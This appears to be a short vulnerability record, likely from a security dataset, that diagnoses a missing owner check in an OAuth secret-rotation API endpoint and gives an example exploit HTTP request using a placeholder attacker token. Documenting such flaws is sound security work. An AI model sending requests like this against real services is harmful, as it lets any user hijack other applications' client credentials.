diagnosis: The view retrieves the OAuth Application solely by client_id without verifying that request.user is the application owner (app.user == request.user). Any authenticated user can rotate secrets for any registered third-party OAuth application, hijacking client credentials and disrupting legitimate OAuth integrations.
exploit_request:
POST /api/oauth/applications/app_live_89104fa2/rotate-secret/ HTTP/1.1
Host: api.platform.example.com
Authorization: Bearer <attacker_access_token>
